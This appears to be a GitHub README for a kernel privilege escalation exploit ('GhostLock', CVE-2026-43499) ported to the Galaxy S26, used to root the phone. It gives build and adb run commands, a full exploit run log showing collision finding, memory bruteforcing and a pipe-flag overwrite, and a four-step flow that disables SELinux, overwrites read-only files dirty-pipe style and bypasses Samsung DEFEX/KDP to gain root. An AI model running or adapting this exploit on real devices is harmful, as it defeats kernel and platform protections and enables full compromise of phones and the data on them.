# GhostLock (CVE-2026-43499) for Galaxy S26
As of 2026-08-11, other exploits for GhostLock don't work on S26. This repo utilize another method (dirty-pipe like file overwrite) to port it to S26 kernel.

Dirty-pipe like method can easily bypass samsung DEFEX/KDP and doesn't rely on ashmem. It is suitable for 6.12 kernel Galaxy devices (Galaxy S26 series).

All done via kernelsnitch'ed address or linearmap. KASLR bypass is not needed at all.

Currently only supports the following device.

| Payload | Compatible models | Kernel version | Status |
| --- | --- | --- | --- |
| `m1q-S942QOPU1AZDE` | Galaxy S26 | `6.12.30-android16-5-pe553c2c-abogkiS942QOPU1AZDE-4k` | Working |

For porting another device or another firmware version, modify target.h and rebuild it.

# Build
```sh
git clone (this repo)
cd (this repo)
cd IonStack/CVE-2026-43499/exploit
export ANDROID_NDK_HOME=(your ndk path)
make PROJECT=m1q-S942QOPU1AZDE
```

And, build ksud + kernelsu.ko using [this tree](https://github.com/polygraphene/KernelSU/tree/a5531763971cf034e3f630d31654189a148e5f81) by [this instruction](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/README.md).
This tree contains [a patch from BuSung-dev/Root-My-Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/blob/61a543e206bf503b54ffb2ac8329c2cd1b99a695/kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch) and 6.12 adaptation.

# Run
```sh
$ adb push $KERNELSU/target/aarch64-linux-android/release/ksud /data/local/tmp
$ adb push (this repo)/IonStack/CVE-2026-43499/exploit/build/m1q-S942QOPU1AZDE/bin/preload.so /data/local/tmp
$ adb shell env LD_PRELOAD=/data/local/tmp/preload.so sh
[11:09:13.989467] [+] preload starting pid=14014
[11:09:13.990172] [+] startup context pid=14014 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[11:09:13.990184] [+] startup limits pid=14014 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[11:09:13.990192] [+] build config pid=14014 label=m1q-S942QOPU1AZDE-pipe-flag slide=pselect main=pselect
[11:09:13.990204] [+] p0 profile pid=14014 phys_offset=0000000080000000 kernel_phys_load=00000000c7800000 delta=0000000047800000 slide_logger=ffffff8049d221c0 bootid_data=ffffff8049e4cf48 init_task=ffffff8049d2d040 root_tg=ffffff8049f63580 sysctl_bootid=ffffff804a092e70
[11:09:13.990354] [*] selinux is already disabled. Skip.
[11:09:13.990362] [*] Selinux phase done. Go to pipe flag phase.
[11:09:14.962312] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[11:09:15.146882] [*] start finding collisisons
[11:09:15.147060] [*] target    000000712b2020c8
[11:09:16.382573] [*]   0000005e99d74ba0
[11:09:16.469593] [*]   0000005e99e6e370
[11:09:16.579350] [*]   0000005e9a03c1e0
[11:09:16.579418] [*] found 3 collisisons
[11:09:16.630422] [*] start bruteforcing
[11:09:16.630636] [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
[11:09:16.630657] [11:09:16.630679] [*] [  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
[*] [  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
[11:09:16.630703] [*] [  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
[11:09:16.630716] [*] [  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
[11:09:16.630765] [*] [  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
[11:09:16.633642] [*] [  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
[11:09:16.633644] [*] [  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
[11:09:16.693938] [*] done
[11:09:16.694400] [*] pipe flags route page base=ffffff895eda8000
[11:09:16.848606] [*] parameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[11:09:17.017248] [*] start finding collisisons
[11:09:17.017375] [*] target    000000712b2020c8
[11:09:17.190548] [*]   0000005e99b5cae0
[11:09:17.531917] [*]   0000005e9a32e970
[11:09:17.620552] [*]   0000005e9a451288
[11:09:17.620610] [*] found 3 collisisons
[11:09:17.670705] [*] start bruteforcing
[11:09:17.670879] [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
[11:09:17.670944] [*] [  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
[11:09:17.670975] [*] [  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
[11:09:17.671026] [11:09:17.671029] [*] [  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
[11:09:17.671044] [*] [  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
[*] [  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
[11:09:17.673644] [*] [  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
[11:09:17.673659] [*] [  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
[11:09:17.763413] [*] done
[11:09:17.881245] [*] run_main_route_threads
[11:09:18.882501] [11:09:18.882499] [*] pselect enter
[*] consumer usleep=50000
[11:09:18.932669] [*] sched_setattr_tid enter
[11:09:18.932924] [*] sched_setattr_tid exit
[11:09:19.883536] [*] pselect returned attempt=1 ret=3 errno=0 calls=1 success=1 delay=50000
[11:09:19.883610] [*] phase=3
[11:09:19.883633] [*] try_pipe_flags_stage called
[11:09:19.884081] [+] pipe overwrite succeeded.
[11:09:19.884145] [*] pselect route done calls=1 success=1 step=0 errno=0
[11:09:19.887843] [*] Executing setprop ctl.start vendor.modprobe
```
Then, install KernelSU Manager.

logcat should include logs like the followings if succeeded.
```
$ logcat | grep GHOSTLOCK
08-12 11:09:19.905 24264 24264 I GHOSTLOCK: uid=0(root) gid=0(root) groups=0(root),1000(system) context=u:r:vendor_modprobe:s0
08-12 11:09:19.909 24265 24265 I GHOSTLOCK: [*] Am I root? uid=0
08-12 11:09:19.919 24265 24265 I GHOSTLOCK: [*] cp result=0
08-12 11:09:20.062 24265 24265 I GHOSTLOCK: [*] ksud result=0
```

# Flow
1. Disable selinux by vuln
2. Modify pipe flag by vuln (add `can_merge` flag)
3. Overwrite readonly file like dirty-pipe
4. Get root

# Acknowledgments
- [Nebula Security](https://github.com/NebuSec/CyberMeowfia): Vulnerability and original exploit
- [@JoinChang](https://github.com/JoinChang/ghostlock-oneplus): Idea for disabling selinux
- [@BuSung-dev](https://github.com/BuSung-dev/Root-My-Galaxy): Idea for bypassing security of Samsung DEFEX/KDP and good documentation for porting
- [@veritas501](https://github.com/veritas501/pipe-primitive): Idea for triggering dirty-pipe like behavior from kernel memory corruption
- [@lukasmaar](https://github.com/lukasmaar/kernelsnitch): This exploit is heavily dependent on kernelsnitch

